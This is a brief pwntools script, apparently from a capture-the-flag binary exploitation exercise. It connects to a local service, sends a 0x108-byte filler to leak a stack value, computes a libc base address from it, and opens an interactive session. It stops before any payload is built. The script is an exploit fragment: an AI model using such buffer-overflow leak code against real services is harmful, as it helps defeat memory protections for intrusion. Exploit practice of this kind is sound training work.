from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = '0.0.0.0', 31338
r = remote(HOST, PORT)

r.sendafter(b'> ', b'A'*0x108)
r.recvuntil(b'A'*0x108)
libc = u64(r.recv(6).ljust(8,b'\x00')) - 0x2a1ca


r.interactive()